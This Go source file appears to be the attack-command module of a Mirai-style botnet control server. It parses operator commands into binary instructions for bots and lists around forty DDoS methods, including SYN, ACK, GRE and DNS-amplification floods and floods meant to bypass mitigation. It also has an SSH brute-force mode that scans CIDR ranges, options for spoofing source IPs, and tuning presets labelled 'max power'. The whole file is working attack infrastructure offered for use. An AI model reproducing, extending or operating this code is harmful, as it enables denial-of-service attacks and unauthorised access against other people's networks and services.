package main
import (
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"github.com/mattn/go-shellwords"
)
type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}
type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 
	Flags    map[uint8]string 
	Domain   string           
}
type FlagInfo struct {
	flagID          uint8
	flagDescription string
}
var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"size":      {0, "Size of packet data, default is 512 bytes"},
	"rand":      {1, "Randomize packet data content, default is 1 (yes)"},
	"tos":       {2, "TOS field value in IP header, default is 0"},
	"ident":     {3, "ID field value in IP header, default is random"},
	"ttl":       {4, "TTL field in IP header, default is 255"},
	"df":        {5, "Set the Dont-Fragment bit in IP header, default is 0 (no)"},
	"sport":     {6, "Source port, default is random"},
	"port":      {7, "Destination port, default is random"},
	"domain":    {8, "Domain name to attack"},
	"dhid":      {9, "Domain name transaction ID, default is random"},
	"urg":       {11, "Set the URG bit in IP header, default is 0 (no)"},
	"ack":       {12, "Set the ACK bit in IP header, default is 0 (no) except for ACK flood"},
	"psh":       {13, "Set the PSH bit in IP header, default is 0 (no)"},
	"rst":       {14, "Set the RST bit in IP header, default is 0 (no)"},
	"syn":       {15, "Set the SYN bit in IP header, default is 0 (no) except for SYN flood"},
	"fin":       {16, "Set the FIN bit in IP header, default is 0 (no)"},
	"seqnum":    {17, "Sequence number value in TCP header, default is random"},
	"acknum":    {18, "Ack number value in TCP header, default is random"},
	"gcip":      {19, "Set internal IP to destination ip, default is 0 (no)"},
	"method":    {20, "HTTP method name, default is get"},
	"postdata":  {21, "POST data, default is empty/none"},
	"path":      {22, "HTTP path, default is /"},
	"ssl":       {23, "Use HTTPS/SSL"},
	"threads":   {24, "Number of threads (1-256, default varies by method)"},
	"source":    {25, "Source IP address, 255.255.255.255 for random"},
	"minlen":    {26, "min len"},
	"maxlen":    {27, "max len"},
	"payload":   {28, "custom payload"},
	"repeat":    {29, "number of times to repeat"},
	"ratelimit": {30, "Rate limit for requests per second"},
	"conns":     {31, "Number of connections/sockets (1-1000, default varies by method)"},
	"cidr":      {36, "CIDR range for scanning (e.g. 194.161.56.0/24)"},
	"dict":      {37, "Dictionary name for bruteforce (e.g. common.txt)"},
	"scan_mode": {38, "Scan mode: 0=quick, 1=full, 2=smart"},
	"bot_id":    {39, "Bot ID for load distribution"},
	"total_bots": {40, "Total number of bots online"},
	"protocols": {43, "Comma-separated list of protocols for autobypass (greip,greeth,tcpsyn,tcpack,tcpall,udp,tcp,tcpfrag,tcpbypass,ice,icmp,ntp or 'all')"},
	"rawsocket": {45, "Use raw sockets (1=yes, 0=no, default 0)"},
	"binddev": {46, "Bind socket to network device (e.g. eth0)"},
	"sndbuf": {47, "Send buffer size in bytes (default 4194304)"},
	"srcmode": {48, "Source IP mode: real, random, sequential, custom"},
	"srcstart": {49, "Source IP range start (for sequential/custom mode)"},
	"srcend": {50, "Source IP range end (for sequential/custom mode)"},
	"ipidmode": {51, "IP ID mode: random, sequential, zero"},
	"mf": {52, "More Fragments bit (1=set, 0=clear)"},
	"fragoff": {53, "Fragment offset"},
	"mss": {54, "TCP Maximum Segment Size"},
	"win": {55, "TCP window size"},
	"wscale": {56, "TCP window scale"},
	"sack": {57, "TCP Selective Acknowledgment (1=enable, 0=disable)"},
	"ts": {58, "TCP timestamps (1=enable, 0=disable)"},
	"nop": {59, "Number of TCP NOP options"},
	"seqrand": {60, "Randomize TCP sequence numbers (1=yes, 0=no)"},
	"ackrand": {61, "Randomize TCP ack numbers (1=yes, 0=no)"},
	"pps": {62, "Packets per second limit (0=unlimited)"},
	"bps": {63, "Bytes per second limit (0=unlimited)"},
	"burst": {64, "Burst size for rate limiting"},
	"payloadmode": {65, "Payload mode: random, zero, pattern, custom"},
	"payloadpat": {66, "Payload pattern (hex string)"},
	"osfp": {67, "OS fingerprint: linux, windows, freebsd, random"},
	"ttlrand": {68, "Randomize TTL (1=yes, 0=no)"},
	"ttlmin": {69, "Minimum TTL for randomization"},
	"ttlmax": {70, "Maximum TTL for randomization"},
	"portrand": {71, "Randomize destination port (1=yes, 0=no)"},
	"portmin": {72, "Minimum port for randomization"},
	"portmax": {73, "Maximum port for randomization"},
	"tcpflags": {74, "TCP flags combination (syn, syn+ack, ack+psh, fin+ack, etc.)"},
	"tcpflagsmode": {75, "TCP flags mode: random, sequential, custom"},
	"ipdelay": {76, "Inter-packet delay in microseconds"},
	"jitter": {77, "Random jitter in microseconds"},
	"packetorder": {78, "Packet ordering: sequential, random, roundrobin"},
	"burstpat": {79, "Burst pattern: linear, exponential, random"},
	"sizerand": {80, "Randomize packet size (1=yes, 0=no)"},
	"sizemin": {81, "Minimum packet size"},
	"sizemax": {82, "Maximum packet size"},
	"sportrand": {83, "Randomize source port (1=yes, 0=no)"},
	"sportmin": {84, "Minimum source port"},
	"sportmax": {85, "Maximum source port"},
	"seqpat": {86, "Sequence pattern: random, increment, zero, os"},
	"ackpat": {87, "Ack pattern: random, increment, zero, os"},
	"seqinc": {88, "Sequence increment step"},
	"ackinc": {89, "Ack increment step"},
	"ipprec": {90, "IP precedence (0-7)"},
	"dscp": {91, "DSCP value (0-63)"},
	"ecn": {92, "ECN bit (1=set, 0=clear)"},
	"urgptr": {93, "TCP urgent pointer value"},
	"winrand": {94, "Randomize window size (1=yes, 0=no)"},
	"winmin": {95, "Minimum window size"},
	"winmax": {96, "Maximum window size"},
	"mssrand": {97, "Randomize MSS (1=yes, 0=no)"},
	"mssmin": {98, "Minimum MSS"},
	"mssmax": {99, "Maximum MSS"},
	"keepalive": {100, "TCP keepalive (1=enable, 0=disable)"},
	"keepint": {101, "Keepalive interval in seconds"},
	"retry": {102, "Retry count"},
	"timeout": {103, "Connection timeout in milliseconds"},
	"congestion": {104, "Congestion control: reno, cubic, bbr, random"},
}
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"handshake":   {0, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "stomp/handshake flood to bypass mitigation devices"},
	"udp":         {1, []uint8{0, 1, 7}, "UDP Flooding, DGRAM UDP with less PPS Speed"},
	"std":         {2, []uint8{0, 1, 7}, "std flood (uid1 supported)"},
	"tcp":         {3, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP flood (urg,ack,syn)"},
	"ack":         {4, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood optimized for higher GBPS"},
	"syn":         {5, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "SYN flood optimized for higher GBPS"},
	"hex":         {6, []uint8{0, 1, 7}, "HEX flood"},
	"stdhex":      {7, []uint8{0, 6, 7}, "STDHEX flood"},
	"nudp":        {8, []uint8{0, 6, 7}, "NUDP flood"},
	"udphex":      {9, []uint8{8, 7, 20, 21, 22}, "UDPHEX flood"},
	"xmas":        {10, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "XMAS RTCP Flag Flood"},
	"bypass":      {11, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "strong tcp bypass"},
	"tcpbypass":   {11, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "tcpbypass - raw TCP bypass flood (ACK/PSH/FIN)"},
	"orbitv3":     {11, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "strong tcp bypass (orbitv3)"},
	"raw":         {12, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 29}, "raw udp flood"},
	"cudp":        {13, []uint8{0, 1, 7, 26, 27, 28, 29}, "udp flood with custom payload"},
	"ovhtcp":      {14, []uint8{0, 1, 7, 24, 26, 27, 28, 29}, "ovhtcp bypass new (test)"},
	"slowudp":     {18, []uint8{7, 0, 6, 24}, "slowloris udp attack (slow packets)"},
	"socket":      {21, []uint8{0, 2, 4, 6, 7, 24, 31}, "legitimate tcp socket flood (full handshake, clean traffic)"},
	"zconnect":    {22, []uint8{0, 2, 3, 4, 6, 7, 24, 31, 34}, "zconnect bypass (legitimate traffic -> aggressive bypass)"},
	"tcp_full":    {25, []uint8{2, 3, 4, 5, 6, 7, 24}, "tcp full handshakes - no SYN flood, bypasses SYNPROXY/SYNCOOKIES/RFC 5925"},
	"tcp_connect": {27, []uint8{2, 3, 4, 5, 6, 7, 24}, "tcp connect - binary filled handshakes with SYN/ACK RFC 793 packets"},
	"orbitv3pps":  {30, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 30}, "orbitv3 high-pps tcp bypass (batched sendmmsg)"},
	"orbitv4":     {31, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 30}, "orbitv4 - legitimate traffic with full TCP handshakes, small packets, OS fingerprint emulation"},
	"ssh_bruteforce": {32, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 30, 36, 37, 38, 39, 40}, "ssh bruteforce with CIDR ranges and dictionary"},
	"tcpipi":      {33, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 30}, "tcp ipi flood - raw TCP with randomized options, TTL, TOS, window"},
	"greip":       {34, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood - GRE encapsulated IP packets"},
	"greeth":      {35, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE ETH flood - GRE encapsulated Ethernet packets"},
	"tcpsyn":      {36, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP SYN flood with options"},
	"randhex":     {37, []uint8{0, 1, 6, 7}, "random hex UDP flood"},
	"tcpack":      {38, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP ACK flood with payload"},
	"tcpstomp":    {39, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "TCP stomp flood - handshake based"},
	"udpgeneric":  {40, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 25}, "generic UDP flood with raw sockets"},
	"udpvse":      {41, []uint8{0, 1, 2, 3, 4, 5, 6, 7}, "UDP VSE flood - Valve Source Engine"},
	"udpdns":      {42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, "UDP DNS flood"},
	"ice":         {43, []uint8{0, 1, 6, 7}, "ICE UDP flood"},
	"tcpall":      {44, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP all flags flood"},
	"tcpfrag":     {45, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP fragment flood"},
	"asyn":        {46, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "asynchronous GRE flood"},
	"autobypass":  {47, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 31, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104}, "Auto-bypass: combines GRE/TCP/UDP/ICMP/NTP for maximum L3/L4 bypass with raw sockets"},
}
var requiredFlags map[string][]string = map[string][]string{
	"slowudp":        {"port"},
	"socket":         {"port"},
	"zconnect":       {"port"},
	"tcp_full":       {"port"},
	"tcp_connect":    {"port"},
	"orbitv3pps":     {"port"},
	"orbitv4":        {"port"},
	"ssh_bruteforce": {"cidr", "dict"},
	"tcpipi":         {"port"},
	"greip":          {"port"},
	"greeth":         {"port"},
	"tcpsyn":         {"port"},
	"tcpack":         {"port"},
	"tcpstomp":       {"port"},
	"udpgeneric":     {"port"},
	"udpvse":         {"port"},
	"udpdns":         {"domain"},
	"randhex":        {"port"},
	"ice":            {"port"},
	"tcpall":         {"port"},
	"tcpfrag":        {"port"},
	"asyn":           {"port"},
	"autobypass":     {"port"},
}
var powerRecommendations map[string]string = map[string]string{
	"slowudp":        "port=80 threads=128 size=512 - max power for slowloris",
	"socket":         "port=80 threads=256 conns=1000 size=1460 - full TCP handshake flood",
	"zconnect":       "port=443 threads=128 conns=500 size=1024 - bypass mode",
	"tcp_full":       "port=80 threads=256 size=1460 ttl=64 - bypass SYNPROXY",
	"tcp_connect":    "port=443 threads=256 size=1024 - binary handshake flood",
	"orbitv3pps":     "port=80 threads=256 size=32 ratelimit=0 - max PPS mode",
	"orbitv4":        "port=443 threads=128 size=64 ttl=64 - legitimate traffic simulation",
	"ssh_bruteforce": "cidr=X.X.X.X/24 dict=common.txt threads=64 - distributed scan",
	"tcpipi":         "port=80 threads=256 size=1460 ttl=random tos=random - randomized TCP",
	"greip":          "port=53 size=1024 ttl=64 source=255.255.255.255 - GRE IP flood",
	"greeth":         "port=53 size=1024 ttl=64 source=255.255.255.255 - GRE ETH flood",
	"tcpsyn":         "port=80 size=1460 ttl=64 source=255.255.255.255 syn=1 - SYN flood",
	"randhex":        "port=53 size=1458 - random UDP payload",
	"tcpack":         "port=80 size=1024 ttl=64 ack=1 psh=1 - ACK flood",
	"tcpstomp":       "port=80 size=768 ttl=64 ack=1 psh=1 - handshake based",
	"udpgeneric":     "port=53 size=1024 ttl=64 source=255.255.255.255 - raw UDP",
	"udpvse":         "port=27015 size=512 - Valve Source Engine",
	"udpdns":         "domain=example.com port=53 size=512 ttl=64 - DNS amplification",
	"ice":            "port=3478 size=512 - ICE protocol flood",
	"tcpall":         "port=80 ttl=64 urg=1 ack=1 psh=1 rst=1 syn=1 fin=1 - all flags",
	"tcpfrag":        "port=80 size=1460 ttl=64 df=0 - fragment flood",
	"asyn":           "port=53 size=912 ttl=64 source=255.255.255.255 - async GRE",
	"autobypass":     "port=80 threads=128 size=512 ttl=64 - auto-combines all protocols for max bypass",
}
func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}
func loadDictionary(dictName string) (string, error) {
	dictPath := fmt.Sprintf("dicts/%s", dictName)
	data, err := ioutil.ReadFile(dictPath)
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(data), "\n")
	var words []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			words = append(words, line)
		}
	}
	if len(words) == 0 {
		return "", fmt.Errorf("Dictionary is empty")
	}
	dictContent := strings.Join(words, ",")
	if len(dictContent) > 255 {
		return "", fmt.Errorf("Dictionary content exceeds 255 bytes")
	}
	return dictContent, nil
}
func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string), ""}
	args, _ := shellwords.Parse(str)
	var atkInfo AttackInfo
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	}
	if args[0] == "?" {
		validCmdList := "\x1b[0;36m\x1b[1mAvailable attack methods:\x1b[0m\r\n\r\n"
		type methodEntry struct {
			name        string
			id          uint8
			description string
		}
		var methods []methodEntry
		for cmdName, atkInfo := range attackInfoLookup {
			methods = append(methods, methodEntry{
				name:        cmdName,
				id:          atkInfo.attackID,
				description: atkInfo.attackDescription,
			})
		}
		for i := 0; i < len(methods)-1; i++ {
			for j := i + 1; j < len(methods); j++ {
				if methods[i].id > methods[j].id {
					methods[i], methods[j] = methods[j], methods[i]
				}
			}
		}
		for _, m := range methods {
			validCmdList += fmt.Sprintf("\x1b[1;35m%-15s\x1b[0m - %s\r\n", m.name, m.description)
		}
		validCmdList += "\r\n\x1b[1;36mUsage: <method> <target> <duration> [flags]\x1b[0m\r\n"
		validCmdList += "\x1b[1;33mExample: nudp 1.2.3.4 120 port=666\x1b[0m\r\n"
		validCmdList += "\x1b[1;33mUse '<method> ?' to see available flags for specific method\x1b[0m\r\n"
		return nil, errors.New(validCmdList)
	}
	var exists bool
	atkInfo, exists = attackInfoLookup[args[0]]
	if !exists {
		return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid command!", args[0]))
	}
	atk.Type = atkInfo.attackID
	args = args[1:]
	if len(args) == 0 {
		if atk.Type == 32 {
			return nil, errors.New("ssh_bruteforce requires CIDR range (e.g. 194.161.56.0/24) or use cidr= flag")
		}
		return nil, errors.New("Must specify a domain or IP as target")
	}
	if args[0] == "?" {
		return nil, errors.New("\033[37;1mTarget domain or IP\r\nEx: lox.com\r\nEx: http://example.com\033[0m")
	}
	target := args[0]
	prefix := ""
	netmask := uint8(32)
	var scheme, host, portStr string
	if strings.Contains(target, "/") && !strings.Contains(target, ":") {
		ipNetParts := strings.SplitN(target, "/", 2)
		ip := net.ParseIP(ipNetParts[0])
		if ip == nil {
			return nil, fmt.Errorf("Invalid IP: %s", ipNetParts[0])
		}
		mask, err := strconv.Atoi(ipNetParts[1])
		if err != nil || mask < 0 || mask > 32 {
			return nil, fmt.Errorf("Invalid netmask: %s", ipNetParts[1])
		}
		prefix = ipNetParts[0]
		netmask = uint8(mask)
		if atk.Type == 32 {
			atk.Flags[36] = target
			atk.Domain = ""
		} else {
			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = netmask
			atk.Domain = ""
		}
	} else if atk.Type == 32 {
		return nil, errors.New("ssh_bruteforce requires CIDR range (e.g. 194.161.56.0/24) or use cidr= flag")
	} else {
		domain := target
		if strings.Contains(domain, ":") {
			urlParts := strings.SplitN(domain, ":", 2)
			scheme = strings.ToLower(urlParts[0])
			hostPort := urlParts[1]
			if strings.Contains(hostPort, ":") {
				host, portStr, _ = net.SplitHostPort(hostPort)
			} else {
				host = hostPort
				switch scheme {
				case "http":
					portStr = "80"
				case "https":
					portStr = "443"
				}
			}
			if scheme == "https" {
				atk.Flags[23] = "1"
			}
			if portStr != "" {
				atk.Flags[7] = portStr
			}
		} else {
			host = domain
		}
		atk.Domain = host
		if atk.Type != 17 && atk.Type != 32 {
			ips, err := net.LookupIP(host)
			if err != nil || len(ips) == 0 {
				return nil, fmt.Errorf("DNS error: %s", host)
			}
			prefix = ips[0].String()
			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, fmt.Errorf("Invalid IP: %s", prefix)
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
	}
	args = args[1:]
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack duration")
	}
	if args[0] == "?" {
		return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > 21600 {
		return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 21600 seconds", args[0]))
	}
	atk.Duration = uint32(duration)
	args = args[1:]
	methodName := ""
	for name, info := range attackInfoLookup {
		if info.attackID == atk.Type {
			methodName = name
			break
		}
	}
	switch atk.Type {
	case 17:
		if len(args) < 1 || !strings.HasPrefix(args[0], "port=") {
			return nil, errors.New("Must specify port=<port> for httpflood attack")
		}
		portSplit := strings.SplitN(args[0], "=", 2)
		if len(portSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("Invalid port format: %s", args[0]))
		}
		port, err := strconv.Atoi(portSplit[1])
		if err != nil || port <= 0 || port > 65535 {
			return nil, errors.New(fmt.Sprintf("Invalid port value: %s", portSplit[1]))
		}
		atk.Flags[7] = portSplit[1]
		args = args[1:]
	}
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
			for _, flagID := range atkInfo.attackFlags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		if flagInfo.flagID == 37 && atk.Type == 32 {
			dictContent, err := loadDictionary(flagSplit[1])
			if err != nil {
				return nil, fmt.Errorf("Failed to load dictionary %s: %v", flagSplit[1], err)
			}
			if len(dictContent) > 255 {
				return nil, fmt.Errorf("Dictionary %s is too large (max 255 bytes)", flagSplit[1])
			}
			atk.Flags[uint8(flagInfo.flagID)] = dictContent
		} else {
			atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		}
		args = args[1:]
	}
	if atk.Domain != "" && atk.Flags[8] == "" {
		atk.Flags[8] = atk.Domain
	}
	if required, exists := requiredFlags[methodName]; exists {
		missingFlags := []string{}
		for _, flagName := range required {
			flagInfo, _ := flagInfoLookup[flagName]
			if _, flagSet := atk.Flags[flagInfo.flagID]; !flagSet {
				missingFlags = append(missingFlags, flagName)
			}
		}
		if len(missingFlags) > 0 {
			errorMsg := fmt.Sprintf("\x1b[1;31mMissing required flags: %s\x1b[0m\r\n", strings.Join(missingFlags, ", "))
			if rec, hasRec := powerRecommendations[methodName]; hasRec {
				errorMsg += fmt.Sprintf("\x1b[1;36mRecommended for max power:\x1b[0m %s %s %d \x1b[1;33m%s\x1b[0m\r\n", methodName, target, duration, rec)
			}
			return nil, errors.New(errorMsg)
		}
	}
	return atk, nil
}
func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte
	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)
	buf = append(buf, byte(this.Type))
	if this.Type == 17 {
		buf = append(buf, byte(1))
		if this.Domain == "" {
			return nil, errors.New("Domain is required for HTTP-based attacks")
		}
		domainBytes := []byte(this.Domain)
		if len(domainBytes) > 255 {
			return nil, errors.New("Domain length cannot exceed 255 bytes")
		}
		tmp = make([]byte, 5)
		tmp[0] = 0xFF
		tmp[1] = 0
		tmp[2] = 0
		tmp[3] = 0
		tmp[4] = byte(len(domainBytes))
		buf = append(buf, tmp...)
		buf = append(buf, domainBytes...)
	} else {
		buf = append(buf, byte(len(this.Targets)))
		if len(this.Targets) > 0 {
			for prefix, netmask := range this.Targets {
				tmp = make([]byte, 5)
				binary.BigEndian.PutUint32(tmp, prefix)
				tmp[4] = byte(netmask)
				buf = append(buf, tmp...)
			}
		}
	}
	buf = append(buf, byte(len(this.Flags)))
	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}
	if len(buf) > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)
	return buf, nil
}
